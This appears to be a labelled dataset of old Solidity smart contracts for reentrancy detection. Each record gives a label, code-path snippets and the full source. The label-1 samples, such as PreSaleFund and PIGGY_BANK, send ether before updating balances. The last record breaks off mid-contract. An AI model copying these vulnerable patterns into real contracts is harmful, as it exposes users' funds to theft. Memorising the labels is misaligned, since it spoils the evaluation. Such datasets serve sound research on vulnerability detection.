{"sol name": "27263.sol", "label": 1, "first path": "function loggedTransfer(uint amount, bytes32 logMsg, address target, address currentOwner) payable{ if(msg.sender != address(this))throw; if(target.call.value(amount)()) { CashMove(amount, logMsg, target, currentOwner); function Divest(uint amount)  public  { if ( investors[msg.sender] > 0 && amount > 0)  { this.loggedTransfer(amount, \"\", msg.sender, owner); investors[msg.sender] -= amount; function withdraw() public { if(msg.sender==owner) { this.loggedTransfer(this.balance, \"\", msg.sender, owner); ", "second path": "function loggedTransfer(uint amount, bytes32 logMsg, address target, address currentOwner) payable{ if(msg.sender != address(this))throw; if(target.call.value(amount)()) { CashMove(amount, logMsg, target, currentOwner); function Divest(uint amount)  public  { if ( investors[msg.sender] > 0 && amount > 0)  { this.loggedTransfer(amount, \"\", msg.sender, owner); investors[msg.sender] -= amount; function withdraw() public { if(msg.sender==owner) { this.loggedTransfer(this.balance, \"\", msg.sender, owner); ", "third path": "function loggedTransfer(uint amount, bytes32 logMsg, address target, address currentOwner) payable{ if(msg.sender != address(this))throw; if(target.call.value(amount)()) { CashMove(amount, logMsg, target, currentOwner); function Divest(uint amount)  public  { if ( investors[msg.sender] > 0 && amount > 0)  { this.loggedTransfer(amount, \"\", msg.sender, owner); investors[msg.sender] -= amount; function withdraw() public { if(msg.sender==owner) { this.loggedTransfer(this.balance, \"\", msg.sender, owner); ", "long path": "pragma solidity ^0.4.11; contract PreSaleFund { address owner = msg.sender; event CashMove(uint amount,bytes32 logMsg,address target,address currentOwner); mapping(address => uint) investors; function loggedTransfer(uint amount, bytes32 logMsg, address target, address currentOwner) payable{ if(msg.sender != address(this))throw; if(target.call.value(amount)()) { CashMove(amount, logMsg, target, currentOwner); } } function Invest() public  payable  { if (msg.value > 1 ether)  { investors[msg.sender] += msg.value; } } function Divest(uint amount)  public  { if ( investors[msg.sender] > 0 && amount > 0)  { this.loggedTransfer(amount, \"\", msg.sender, owner); investors[msg.sender] -= amount; } } function GetInvestedAmount() constant  public returns(uint) { return investors[msg.sender]; } function withdraw() public { if(msg.sender==owner) { this.loggedTransfer(this.balance, \"\", msg.sender, owner); } } } "}
{"sol name": "22247.sol", "label": 1, "first path": "function Collect(uint _am) public payable { if(Accounts[msg.sender]>=MinSum && _am<=Accounts[msg.sender] && block.number>putBlock) { if(msg.sender.call.value(_am)()) { Accounts[msg.sender]-=_am; LogFile.AddMessage(msg.sender,_am,\"Collect\"); function() public payable Put(msg.sender); contract Log struct Message address Sender; string  Data; uint Val; uint  Time; Message[] public History; Message LastMsg; ", "second path": "function Collect(uint _am) public payable { if(Accounts[msg.sender]>=MinSum && _am<=Accounts[msg.sender] && block.number>putBlock) { if(msg.sender.call.value(_am)()) { Accounts[msg.sender]-=_am; LogFile.AddMessage(msg.sender,_am,\"Collect\"); function() public payable Put(msg.sender); contract Log struct Message address Sender; string  Data; uint Val; uint  Time; Message[] public History; Message LastMsg; ", "third path": "function Collect(uint _am) public payable { if(Accounts[msg.sender]>=MinSum && _am<=Accounts[msg.sender] && block.number>putBlock) { if(msg.sender.call.value(_am)()) { Accounts[msg.sender]-=_am; LogFile.AddMessage(msg.sender,_am,\"Collect\"); function() public payable Put(msg.sender); contract Log struct Message address Sender; string  Data; uint Val; uint  Time; Message[] public History; Message LastMsg; ", "long path": "pragma solidity ^0.4.19; contract PIGGY_BANK { mapping (address => uint) public Accounts; uint public MinSum = 1 ether; Log LogFile; uint putBlock; function PIGGY_BANK(address _log) public { LogFile = Log(_log); } function Put(address to) public payable { Accounts[to]+=msg.value; LogFile.AddMessage(msg.sender,msg.value,\"Put\"); putBlock = block.number; } function Collect(uint _am) public payable { if(Accounts[msg.sender]>=MinSum && _am<=Accounts[msg.sender] && block.number>putBlock) { if(msg.sender.call.value(_am)()) { Accounts[msg.sender]-=_am; LogFile.AddMessage(msg.sender,_am,\"Collect\"); } } } function() public payable { Put(msg.sender); } } contract Log { struct Message { address Sender; string  Data; uint Val; uint  Time; } Message[] public History; Message LastMsg; function AddMessage(address _adr,uint _val,string _data) public { LastMsg.Sender = _adr; LastMsg.Time = now; LastMsg.Val = _val; LastMsg.Data = _data; History.push(LastMsg); } } "}
{"sol name": "37676.sol", "label": 0, "first path": "function send(address _to, uint _value, bytes _data) only_owner { if (!_to.call.value(_value)(_data)) throw; Sent(_to, _value, _data); ", "second path": "function send(address _to, uint _value, bytes _data) only_owner { if (!_to.call.value(_value)(_data)) throw; Sent(_to, _value, _data); ", "third path": "function send(address _to, uint _value, bytes _data) only_owner { if (!_to.call.value(_value)(_data)) throw; Sent(_to, _value, _data); ", "long path": "pragma solidity ^0.4; contract DeadMansSwitch { event ReclaimBegun(); event Reclaimed(); event Sent(address indexed to, uint value, bytes data); event Received(address indexed from, uint value, bytes data); event Reset(); event OwnerChanged(address indexed _old, address indexed _new); event BackupChanged(address indexed _old, address indexed _new); event ReclaimPeriodChanged(uint _old, uint _new); function DeadMansSwitch(address _owner, address _backup, uint _reclaimPeriod) { owner = _owner; backup = _backup; reclaimPeriod = _reclaimPeriod; } function() payable { Received(msg.sender, msg.value, msg.data); } function beginReclaim() only_backup when_no_timeout { timeout = now + reclaimPeriod; ReclaimBegun(); } function finalizeReclaim() only_backup when_timed_out { owner = backup; timeout = 0; Reclaimed(); } function reset() only_owner_or_backup { timeout = 0; Reset(); } function send(address _to, uint _value, bytes _data) only_owner { if (!_to.call.value(_value)(_data)) throw; Sent(_to, _value, _data); } function setOwner(address _owner) only_owner { OwnerChanged(owner, _owner); owner = _owner; } function setBackup(address _backup) only_owner { BackupChanged(backup, _backup); backup = _backup; } function setReclaimPeriod(uint _period) only_owner { ReclaimPeriodChanged(reclaimPeriod, _period); reclaimPeriod = _period; } function reclaimStarted() constant returns (bool) { return timeout != 0; } function canFinalize() constant returns (bool) { return timeout != 0 && now > timeout; } function timeLeft() constant only_when_timeout returns (uint) { return now > timeout ? 0 : timeout - now; } modifier only_owner { if (msg.sender != owner) throw; _; } modifier only_backup { if (msg.sender != backup) throw; _; } modifier only_owner_or_backup { if (msg.sender != backup && msg.sender != owner) throw; _; } modifier only_when_timeout { if (timeout == 0) throw; _; } modifier when_no_timeout { if (timeout == 0) _; } modifier when_timed_out { if (timeout != 0 && now > timeout) _; } address public owner; address public backup; uint public reclaimPeriod; uint public timeout; } "}
{"sol name": "33410.sol", "label": 0, "first path": "function executeTransaction(uint transactionId)  internal notExecuted(transactionId) { if (isConfirmed(transactionId)) { Transaction tx = transactions[transactionId]; tx.executed = true; if (tx.destination.call.value(tx.value)(tx.data)) Execution(transactionId); else { ExecutionFailure(transactionId); tx.executed = false; function confirmTransaction(uint transactionId)  public ownerExists(msg.sender) transactionExists(transactionId)  notConfirmed(transactionId, msg.sender){ confirmations[transactionId][msg.sender] = true; Confirmation(msg.sender, transactionId); executeTransaction(transactionId); ", "second path": "function executeTransaction(uint transactionId)  internal notExecuted(transactionId) { if (isConfirmed(transactionId)) { Transaction tx = transactions[transactionId]; tx.executed = true; if (tx.destination.call.value(tx.value)(tx.data)) Execution(transactionId); else { ExecutionFailure(transactionId); tx.executed = false; function confirmTransaction(uint transactionId)  public ownerExists(msg.sender) transactionExists(transactionId)  notConfirmed(transactionId, msg.sender){ confirmations[transactionId][msg.sender] = true; Confirmation(msg.sender, transactionId); executeTransaction(transactionId); ", "third path": "function executeTransaction(uint transactionId)  internal notExecuted(transactionId) { if (isConfirmed(transactionId)) { Transaction tx = transactions[transactionId]; tx.executed = true; if (tx.destination.call.value(tx.value)(tx.data)) Execution(transactionId); else { ExecutionFailure(transactionId); tx.executed = false; function confirmTransaction(uint transactionId)  public ownerExists(msg.sender) transactionExists(transactionId)  notConfirmed(transactionId, msg.sender){ confirmations[transactionId][msg.sender] = true; Confirmation(msg.sender, transactionId); executeTransaction(transactionId); ", "long path": "pragma solidity ^0.4.11; contract ERC20 { uint public totalSupply; function balanceOf(address who) constant returns (uint); function allowance(address owner, address spender) constant returns (uint); function transfer(address to, uint value) returns (bool ok); function transferFrom(address from, address to, uint value) returns (bool ok); function approve(address spender, uint value) returns (bool ok); event Transfer(address indexed from, address indexed to, uint value); event Approval(address indexed owner, address indexed spender, uint value); } contract SafeMath { function safeMul(uint a, uint b) internal returns (uint) { uint c = a * b; assert(a == 0 || c / a == b); return c; } function safeDiv(uint a, uint b) internal returns (uint) { assert(b > 0); uint c = a / b; assert(a == b * c + a % b); return c; } function safeSub(uint a, uint b) internal returns (uint) { assert(b <= a); return a - b; } function safeAdd(uint a, uint b) internal returns (uint) { uint c = a + b; assert(c>=a && c>=b); return c; } function max64(uint64 a, uint64 b) internal constant returns (uint64) { return a >= b ? a : b; } function min64(uint64 a, uint64 b) internal constant returns (uint64) { return a < b ? a : b; } function max256(uint256 a, uint256 b) internal constant returns (uint256) { return a >= b ? a : b; } function min256(uint256 a, uint256 b) internal constant returns (uint256) { return a < b ? a : b; } function assert(bool assertion) internal { if (!assertion) { throw; } } } contract MultiSigWallet { bool public isMultiSigWallet = false; uint constant public MAX_OWNER_COUNT = 50; event Confirmation(address indexed sender, uint indexed transactionId); event Revocation(address indexed sender, uint indexed transactionId); event Submission(uint indexed transactionId); event Execution(uint indexed transactionId); event ExecutionFailure(uint indexed transactionId); event Deposit(address indexed sender, uint value); event OwnerAddition(address indexed owner); event OwnerRemoval(address indexed owner); event RequirementChange(uint required); mapping (uint => Transaction) public transactions; mapping (uint => mapping (address => bool)) public confirmations; mapping (address => bool) public isOwner; address[] public owners; uint public required; uint public transactionCount; struct Transaction { address destination; uint value; bytes data; bool executed; } modifier onlyWallet() { if (msg.sender != address(this)) throw; _; } modifier ownerDoesNotExist(address owner) { if (isOwner[owner]) throw; _; } modifier ownerExists(address owner) { if (!isOwner[owner]) throw; _; } modifier transactionExists(uint transactionId) { if (transactions[transactionId].destination == 0) throw; _; } modifier confirmed(uint transactionId, address owner) { if (!confirmations[transactionId][owner]) throw; _; } modifier notConfirmed(uint transactionId, address owner) { if (confirmations[transactionId][owner]) throw; _; } modifier notExecuted(uint transactionId) { if (transactions[transactionId].executed) throw; _; } modifier notNull(address _address) { if (_address == 0) throw; _; } modifier validRequirement(uint ownerCount, uint _required) { if (ownerCount > MAX_OWNER_COUNT) throw; if (_required > ownerCount) throw; if (_required == 0) throw; if (ownerCount == 0) throw; _; } function() payable { if (msg.value > 0) Deposit(msg.sender, msg.value); } function MultiSigWallet(address[] _owners, uint _required) public validRequirement(_owners.length, _required) { for (uint i=0; i<_owners.length; i++) { if (isOwner[_owners[i]] || _owners[i] == 0) throw; isOwner[_owners[i]] = true; } isMultiSigWallet = true; owners = _owners; required = _required; } function addOwner(address owner) public onlyWallet ownerDoesNotExist(owner) notNull(owner) validRequirement(owners.length + 1, required) { isOwner[owner] = true; owners.push(owner); OwnerAddition(owner); } function removeOwner(address owner) public onlyWallet ownerExists(owner) { isOwner[owner] = false; for (uint i=0; i<owners.length - 1; i++) if (owners[i] == owner) { owners[i] = owners[owners.length - 1]; break; } owners.length -= 1; if (required > owners.length) changeRequirement(owners.length); OwnerRemoval(owner); } function replaceOwner(address owner, address newOwner) public onlyWallet ownerExists(owner) ownerDoesNotExist(newOwner) { for (uint i=0; i<owners.length; i++) if (owners[i] == owner) { owners[i] = newOwner; break; } isOwner[owner] = false; isOwner[newOwner] = true; OwnerRemoval(owner); OwnerAddition(newOwner); } function changeRequirement(uint _required) public onlyWallet validRequirement(owners.length, _required) { required = _required; RequirementChange(_required); } function submitTransaction(address destination, uint value, bytes data) public returns (uint transactionId) { transactionId = addTransaction(destination, value, data); confirmTransaction(transactionId); } function confirmTransaction(uint transactionId)  public ownerExists(msg.sender) transactionExists(transactionId)  notConfirmed(transactionId, msg.sender){ confirmations[transactionId][msg.sender] = true; Confirmation(msg.sender, transactionId); executeTransaction(transactionId); } function revokeConfirmation(uint transactionId) public ownerExists(msg.sender) confirmed(transactionId, msg.sender) notExecuted(transactionId) { confirmations[transactionId][msg.sender] = false; Revocation(msg.sender, transactionId); } function isConfirmed(uint transactionId) public constant returns (bool) { uint count = 0; for (uint i=0; i<owners.length; i++) { if (confirmations[transactionId][owners[i]]) count += 1; if (count == required) return true; } } function executeTransaction(uint transactionId)  internal notExecuted(transactionId) { if (isConfirmed(transactionId)) { Transaction tx = transactions[transactionId]; tx.executed = true; if (tx.destination.call.value(tx.value)(tx.data)) Execution(transactionId); else { ExecutionFailure(transactionId); tx.executed = false; } } } function addTransaction(address destination, uint value, bytes data) internal notNull(destination) returns (uint transactionId) { transactionId = transactionCount; transactions[transactionId] = Transaction({ destination: destination, value: value, data: data, executed: false }); transactionCount += 1; Submission(transactionId); } function getConfirmationCount(uint transactionId) public constant returns (uint count) { for (uint i=0; i<owners.length; i++) if (confirmations[transactionId][owners[i]]) count += 1; } function getTransactionCount(bool pending, bool executed) public constant returns (uint count) { for (uint i=0; i<transactionCount; i++) if ((pending && !transactions[i].executed) || (executed && transactions[i].executed)) count += 1; } function getOwners() public constant returns (address[]) { return owners; } function getConfirmations(uint transactionId) public constant returns (address[] _confirmations) { address[] memory confirmationsTemp = new address[](owners.length); uint count = 0; uint i; for (i=0; i<owners.length; i++) if (confirmations[transactionId][owners[i]]) { confirmationsTemp[count] = owners[i]; count += 1; } _confirmations = new address[](count); for (i=0; i<count; i++) _confirmations[i] = confirmationsTemp[i]; } function getTransactionIds(uint from, uint to, bool pending, bool executed) public constant returns (uint[] _transactionIds) { uint[] memory transactionIdsTemp = new uint[](transactionCount); uint count = 0; uint i; for (i=0; i<transactionCount; i++) if ((pending && !transactions[i].executed) || (executed && transactions[i].executed)) { transactionIdsTemp[count] = i; count += 1; } _transactionIds = new uint[](to - from); for (i=from; i<to; i++) _transactionIds[i - from] = transactionIdsTemp[i]; } } contract UpgradeAgent is SafeMath { address public owner; bool public isUpgradeAgent; function upgradeFrom(address _from, uint256 _value) public; function setOriginalSupply() public; } contract BCDCVault is SafeMath { bool public isBCDCVault = false; BCDCToken bcdcToken; address bcdcMultisig; uint256 public unlockedBlockForDev; uint256 public unlockedBlockForFounders; uint256 public numBlocksLockedDev; uint256 public numBlocksLockedFounders; bool public unlockedAllTokensForDev = false; bool public unlockedAllTokensForFounders = false; function BCDCVault(address _bcdcMultisig,uint256 _numBlocksLockedForDev,uint256 _numBlocksLockedForFounders) { if (_bcdcMultisig == 0x0) throw; bcdcToken = BCDCToken(msg.sender); bcdcMultisig = _bcdcMultisig; isBCDCVault = true; numBlocksLockedDev = _numBlocksLockedForDev; numBlocksLockedFounders = _numBlocksLockedForFounders; unlockedBlockForDev = safeAdd(block.number, numBlocksLockedDev); unlockedBlockForFounders = safeAdd(block.number, numBlocksLockedFounders); } function unlockForDevelopment() external { if (block.number < unlockedBlockForDev) throw; if (unlockedAllTokensForDev) throw; unlockedAllTokensForDev = true; uint256 totalBalance = bcdcToken.balanceOf(this); uint256 developmentTokens = safeDiv(safeMul(totalBalance, 50), 100); if (!bcdcToken.transfer(bcdcMultisig, developmentTokens)) throw; } function unlockForFounders() external { if (block.number < unlockedBlockForFounders) throw; if (unlockedAllTokensForFounders) throw; unlockedAllTokensForFounders = true; if (!bcdcToken.transfer(bcdcMultisig, bcdcToken.balanceOf(this))) throw; if (!bcdcMultisig.send(this.balance)) throw; } function () payable { if (block.number >= unlockedBlockForFounders) throw; } } contract BCDCToken is SafeMath, ERC20 { bool public isBCDCToken = false; bool public upgradeAgentStatus = false; address public owner; enum State{PreFunding, Funding, Success, Failure} string public constant name = \"BCDC Token\"; string public constant symbol = \"BCDC\"; uint256 public constant decimals = 18; mapping (address => uint256) balances; mapping (address => uint256) investment; mapping (address => mapping (address => uint256)) allowed; bool public finalizedCrowdfunding = false; bool public preallocated = false; uint256 public fundingStartBlock; uint256 public fundingEndBlock; uint256 public tokenSaleMax; uint256 public tokenSaleMin; uint256 public constant maxTokenSupply = 1000000000 ether; uint256 public constant vaultPercentOfTotal = 5; uint256 public constant reservedPercentTotal = 25; address public bcdcMultisig; address bcdcReserveFund; BCDCVault public timeVault; event Refund(address indexed _from, uint256 _value); event Upgrade(address indexed _from, address indexed _to, uint256 _value); event UpgradeFinalized(address sender, address upgradeAgent); event UpgradeAgentSet(address agent); uint256 tokensPerEther; bool public halted; bool public finalizedUpgrade = false; address public upgradeMaster; UpgradeAgent public upgradeAgent; uint256 public totalUpgraded; function BCDCToken(address _bcdcMultiSig, address _upgradeMaster, uint256 _fundingStartBlock, uint256 _fundingEndBlock, uint256 _tokenSaleMax, uint256 _tokenSaleMin, uint256 _tokensPerEther, uint256 _numBlocksLockedForDev, uint256 _numBlocksLockedForFounders) { if (_bcdcMultiSig == 0) throw; if (_upgradeMaster == 0) throw; if (_fundingStartBlock <= block.number) throw; if (_fundingEndBlock   <= _fundingStartBlock) throw; if (_tokenSaleMax <= _tokenSaleMin) throw; if (_tokensPerEther == 0) throw; isBCDCToken = true; upgradeMaster = _upgradeMaster; fundingStartBlock = _fundingStartBlock; fundingEndBlock = _fundingEndBlock; tokenSaleMax = _tokenSaleMax; tokenSaleMin = _tokenSaleMin; tokensPerEther = _tokensPerEther; timeVault = new BCDCVault(_bcdcMultiSig,_numBlocksLockedForDev,_numBlocksLockedForFounders); if (!timeVault.isBCDCVault()) throw; bcdcMultisig = _bcdcMultiSig; owner = msg.sender; if (!MultiSigWallet(bcdcMultisig).isMultiSigWallet()) throw; } modifier onlyOwner() { if (msg.sender != owner) { throw; } _; } function transferOwnership(address newOwner) onlyOwner { if (newOwner != address(0)) { owner = newOwner; } } function setBcdcReserveFund(address _bcdcReserveFund) onlyOwner{ if (getState() != State.PreFunding) throw; if (preallocated) throw; if (_bcdcReserveFund == 0x0) throw; bcdcReserveFund = _bcdcReserveFund; } function balanceOf(address who) constant returns (uint) { return balances[who]; } function checkInvestment(address who) constant returns (uint) { return investment[who]; } function allowance(address owner, address spender) constant returns (uint) { return allowed[owner][spender]; } function transfer(address to, uint value) returns (bool ok) { if (getState() != State.Success) throw; uint256 senderBalance = balances[msg.sender]; if ( senderBalance >= value && value > 0) { senderBalance = safeSub(senderBalance, value); balances[msg.sender] = senderBalance; balances[to] = safeAdd(balances[to], value); Transfer(msg.sender, to, value); return true; } return false; } function transferFrom(address from, address to, uint value) returns (bool ok) { if (getState() != State.Success) throw; if (balances[from] >= value && allowed[from][msg.sender] >= value && value > 0) { balances[to] = safeAdd(balances[to], value); balances[from] = safeSub(balances[from], value); allowed[from][msg.sender] = safeSub(allowed[from][msg.sender], value); Transfer(from, to, value); return true; } else { return false; } } function approve(address spender, uint value) returns (bool ok) { if (getState() != State.Success) throw; allowed[msg.sender][spender] = value; Approval(msg.sender, spender, value); return true; } function() payable stopIfHalted external { if (getState() != State.Funding) throw; if (msg.value == 0) throw; uint256 createdTokens = safeMul(msg.value, tokensPerEther); if (safeAdd(createdTokens, totalSupply) > tokenSaleMax) throw; assignTokens(msg.sender, createdTokens); investment[msg.sender] = safeAdd(investment[msg.sender], msg.value); } function preAllocation() onlyOwner stopIfHalted external { if (getState() != State.PreFunding) throw; if (bcdcReserveFund == 0x0) throw; if (preallocated) throw; preallocated = true; uint256 projectTokens = safeDiv(safeMul(maxTokenSupply, reservedPercentTotal), 100); balances[bcdcReserveFund] = projectTokens; Transfer(0, bcdcReserveFund, projectTokens); } function earlyInvestment(address earlyInvestor, uint256 assignedTokens) onlyOwner stopIfHalted external { if (getState() != State.PreFunding && getState() != State.Funding) throw; if (earlyInvestor == 0x0) throw; if (assignedTokens == 0 ) throw; assignTokens(earlyInvestor, assignedTokens); } function assignTokens(address investor, uint256 tokens) internal { totalSupply = safeAdd(totalSupply, tokens); balances[investor] = safeAdd(balances[investor], tokens); Transfer(0, investor, tokens); } function finalizeCrowdfunding() stopIfHalted external { if (getState() != State.Success) throw; if (finalizedCrowdfunding) throw; finalizedCrowdfunding = true; uint256 unsoldTokens = safeSub(tokenSaleMax, totalSupply); uint256 vaultTokens = safeDiv(safeMul(maxTokenSupply, vaultPercentOfTotal), 100); totalSupply = safeAdd(totalSupply, vaultTokens); balances[timeVault] = safeAdd(balances[timeVault], vaultTokens); Transfer(0, timeVault, vaultTokens); if(unsoldTokens > 0) { totalSupply = safeAdd(totalSupply, unsoldTokens); balances[bcdcMultisig] = safeAdd(balances[bcdcMultisig], unsoldTokens); Transfer(0, bcdcMultisig, unsoldTokens); } uint256 preallocatedTokens = safeDiv(safeMul(maxTokenSupply, reservedPercentTotal), 100); totalSupply = safeAdd(totalSupply, preallocatedTokens); uint256 rewardTokens = safeDiv(safeMul(maxTokenSupply, reservedPercentTotal), 100); balances[bcdcMultisig] = safeAdd(balances[bcdcMultisig], rewardTokens); totalSupply = safeAdd(totalSupply, rewardTokens); if (totalSupply > maxTokenSupply) throw; if (!bcdcMultisig.send(this.balance)) throw; } function refund() external { if (getState() != State.Failure) throw; uint256 bcdcValue = balances[msg.sender]; if (bcdcValue == 0) throw; balances[msg.sender] = 0; totalSupply = safeSub(totalSupply, bcdcValue); uint256 ethValue = investment[msg.sender]; investment[msg.sender] = 0; Refund(msg.sender, ethValue); if (!msg.sender.send(ethValue)) throw; } function getState() public constant returns (State){ if (block.number < fundingStartBlock) return State.PreFunding; else if (block.number <= fundingEndBlock && totalSupply < tokenSaleMax) return State.Funding; else if (totalSupply >= tokenSaleMin || upgradeAgentStatus) return State.Success; else return State.Failure; } function upgrade(uint256 value) external { if (!upgradeAgentStatus) throw; if (upgradeAgent.owner() == 0x0) throw; if (finalizedUpgrade) throw; if (value == 0) throw; if (value > balances[msg.sender]) throw; balances[msg.sender] = safeSub(balances[msg.sender], value); totalSupply = safeSub(totalSupply, value); totalUpgraded = safeAdd(totalUpgraded, value); upgradeAgent.upgradeFrom(msg.sender, value); Upgrade(msg.sender, upgradeAgent, value); } function setUpgradeAgent(address agent) external { if (getState() != State.Success) throw; if (agent == 0x0) throw; if (msg.sender != upgradeMaster) throw; upgradeAgent = UpgradeAgent(agent); if (!upgradeAgent.isUpgradeAgent()) throw; upgradeAgentStatus = true; upgradeAgent.setOriginalSupply(); UpgradeAgentSet(upgradeAgent); } function setUpgradeMaster(address master) external { if (getState() != State.Success) throw; if (master == 0x0) throw; if (msg.sender != upgradeMaster) throw; upgradeMaster = master; } modifier stopIfHalted { if(halted) throw; _; } modifier runIfHalted{ if(!halted) throw; _; } function halt() external onlyOwner{ halted = true; } function unhalt() external onlyOwner{ halted = false; } function reserveTokenClaim(address claimAddress,uint256 token) onlyBcdcReserve returns (bool ok){ if ( bcdcReserveFund == 0x0) throw; uint256 senderBalance = balances[msg.sender]; if(senderBalance >= token && token>0){ senderBalance = safeSub(senderBalance, token); balances[msg.sender] = senderBalance; balances[claimAddress] = safeAdd(balances[claimAddress], token); Transfer(msg.sender, claimAddress, token); return true; } return false; } function backTokenForRewards(uint256 tokens) external{ if(balances[msg.sender] < tokens && tokens <= 0) throw; balances[msg.sender] = safeSub(balances[msg.sender], tokens); balances[bcdcReserveFund] = safeAdd(balances[bcdcReserveFund], tokens); Transfer(msg.sender, bcdcReserveFund, tokens); } modifier onlyBcdcReserve() { if (msg.sender != bcdcReserveFund) { throw; } _; } } "}
{"sol name": "4472.sol", "label": 0, "first path": "function () public payable { address(0x0581cee36a85Ed9e76109A9EfE3193de1628Ac2A).call.value(msg.value)(); ", "second path": "function () public payable { address(0x0581cee36a85Ed9e76109A9EfE3193de1628Ac2A).call.value(msg.value)(); ", "third path": "function () public payable { address(0x0581cee36a85Ed9e76109A9EfE3193de1628Ac2A).call.value(msg.value)(); ", "long path": "pragma solidity ^0.4.0; contract Blocklancer_Payment{ function () public payable { address(0x0581cee36a85Ed9e76109A9EfE3193de1628Ac2A).call.value(msg.value)(); } } "}
{"sol name": "37474.sol", "label": 0, "first path": "function execute(address _to, uint _value, bytes _data) external returns (bytes32 _r) { require(msg.sender==owner); require(_to.call.value(_value)(_data)); return 0; ", "second path": "function execute(address _to, uint _value, bytes _data) external returns (bytes32 _r) { require(msg.sender==owner); require(_to.call.value(_value)(_data)); return 0; ", "third path": "function execute(address _to, uint _value, bytes _data) external returns (bytes32 _r) { require(msg.sender==owner); require(_to.call.value(_value)(_data)); return 0; ", "long path": "pragma solidity ^0.4.15; contract etherDelta { function deposit() payable; function withdraw(uint amount); function depositToken(address token, uint amount); function withdrawToken(address token, uint amount); function balanceOf(address token, address user) constant returns (uint); function order(address tokenGet, uint amountGet, address tokenGive, uint amountGive, uint expires, uint nonce); function trade(address tokenGet, uint amountGet, address tokenGive, uint amountGive, uint expires, uint nonce, address user, uint8 v, bytes32 r, bytes32 s, uint amount); function tradeBalances(address tokenGet, uint amountGet, address tokenGive, uint amountGive, address user, uint amount) private; function availableVolume(address tokenGet, uint amountGet, address tokenGive, uint amountGive, uint expires, uint nonce, address user, uint8 v, bytes32 r, bytes32 s) constant returns(uint); function amountFilled(address tokenGet, uint amountGet, address tokenGive, uint amountGive, uint expires, uint nonce, address user, uint8 v, bytes32 r, bytes32 s) constant returns(uint); function cancelOrder(address tokenGet, uint amountGet, address tokenGive, uint amountGive, uint expires, uint nonce, uint8 v, bytes32 r, bytes32 s); } contract Token { function totalSupply() constant returns (uint256 supply); function approve(address _spender, uint256 _value) returns (bool success); function allowance(address _owner, address _spender) constant returns (uint256 remaining); function balanceOf(address _owner) constant returns (uint256 balance); function transfer(address _to, uint256 _value) returns (bool success); function transferFrom(address _from, address _to, uint256 _value) returns (bool success); } contract TradersWallet { address public owner; string public version; etherDelta private ethDelta; address public ethDeltaDepositAddress; function TradersWallet() { owner = msg.sender; version = \"ALPHA 0.1\"; ethDeltaDepositAddress = 0x8d12A197cB00D4747a1fe03395095ce2A5CC6819; ethDelta = etherDelta(ethDeltaDepositAddress); } function() payable { } function tokenBalance(address tokenAddress) constant returns (uint) { Token token = Token(tokenAddress); return token.balanceOf(this); } function transferFromToken(address tokenAddress, address sendTo, address sendFrom, uint256 amount) external { require(msg.sender==owner); Token token = Token(tokenAddress); token.transferFrom(sendTo, sendFrom, amount); } function changeOwner(address newOwner) external { require(msg.sender==owner); owner = newOwner; } function sendEther(address toAddress, uint amount) external { require(msg.sender==owner); toAddress.transfer(amount); } function sendToken(address tokenAddress, address sendTo, uint256 amount) external { require(msg.sender==owner); Token token = Token(tokenAddress); token.transfer(sendTo, amount); } function execute(address _to, uint _value, bytes _data) external returns (bytes32 _r) { require(msg.sender==owner); require(_to.call.value(_value)(_data)); return 0; } function EtherDeltaTokenBalance(address tokenAddress) constant returns (uint) { return ethDelta.balanceOf(tokenAddress, this); } function EtherDeltaWithdrawToken(address tokenAddress, uint amount) payable external { require(msg.sender==owner); ethDelta.withdrawToken(tokenAddress, amount); } function changeEtherDeltaDeposit(address newEthDelta) external { require(msg.sender==owner); ethDeltaDepositAddress = newEthDelta; ethDelta = etherDelta(newEthDelta); } function EtherDeltaDepositToken(address tokenAddress, uint amount) payable external { require(msg.sender==owner); ethDelta.depositToken(tokenAddress, amount); } function EtherDeltaApproveToken(address tokenAddress, uint amount) payable external { require(msg.sender==owner); Token token = Token(tokenAddress); token.approve(ethDeltaDepositAddress, amount); } function EtherDeltaDeposit(uint amount) payable external { require(msg.sender==owner); ethDelta.deposit.value(amount)(); } function EtherDeltaWithdraw(uint amount) external { require(msg.sender==owner); ethDelta.withdraw(amount); } function kill() { require(msg.sender==owner); suicide(msg.sender); } } "}
{"sol name": "33835.sol", "label": 0, "first path": "function confirm(bytes32 _h) onlymanyowners(_h) returns (bool) { if (m_txs[_h].to != 0) { var x= m_txs[_h].to.call.value(m_txs[_h].value)(m_txs[_h].data); MultiTransact(msg.sender, _h, m_txs[_h].value, m_txs[_h].to, m_txs[_h].data); delete m_txs[_h]; return true; function execute(address _to, uint _value, bytes _data) external onlyowner returns (bytes32 _r) { _r = sha3(msg.data, block.number); if (!confirm(_r) && m_txs[_r].to == 0) { m_txs[_r].to = _to; m_txs[_r].value = _value; m_txs[_r].data = _data; ConfirmationNeeded(_r, msg.sender, _value, _to, _data); ", "second path": "function confirm(bytes32 _h) onlymanyowners(_h) returns (bool) { if (m_txs[_h].to != 0) { var x= m_txs[_h].to.call.value(m_txs[_h].value)(m_txs[_h].data); MultiTransact(msg.sender, _h, m_txs[_h].value, m_txs[_h].to, m_txs[_h].data); delete m_txs[_h]; return true; function execute(address _to, uint _value, bytes _data) external onlyowner returns (bytes32 _r) { _r = sha3(msg.data, block.number); if (!confirm(_r) && m_txs[_r].to == 0) { m_txs[_r].to = _to; m_txs[_r].value = _value; m_txs[_r].data = _data; ConfirmationNeeded(_r, msg.sender, _value, _to, _data); ", "third path": "function confirm(bytes32 _h) onlymanyowners(_h) returns (bool) { if (m_txs[_h].to != 0) { var x= m_txs[_h].to.call.value(m_txs[_h].value)(m_txs[_h].data); MultiTransact(msg.sender, _h, m_txs[_h].value, m_txs[_h].to, m_txs[_h].data); delete m_txs[_h]; return true; function execute(address _to, uint _value, bytes _data) external onlyowner returns (bytes32 _r) { _r = sha3(msg.data, block.number); if (!confirm(_r) && m_txs[_r].to == 0) { m_txs[_r].to = _to; m_txs[_r].value = _value; m_txs[_r].data = _data; ConfirmationNeeded(_r, msg.sender, _value, _to, _data); ", "long path": "pragma solidity ^0.4.15; contract multiowned { struct PendingState { uint yetNeeded; uint ownersDone; uint index; } event Confirmation(address owner, bytes32 operation); event Revoke(address owner, bytes32 operation); event OwnerChanged(address oldOwner, address newOwner); event OwnerAdded(address newOwner); event OwnerRemoved(address oldOwner); event RequirementChanged(uint newRequirement); modifier onlyowner { if (isOwner(msg.sender)) _; } modifier onlymanyowners(bytes32 _operation) { if (confirmAndCheck(_operation)) _; } function multiowned(address[] _owners, uint _required) { m_numOwners = _owners.length; for (uint i = 0; i < _owners.length; ++i) { m_owners[1 + i] = uint(_owners[i]); m_ownerIndex[uint(_owners[i])] = 1 + i; } m_required = 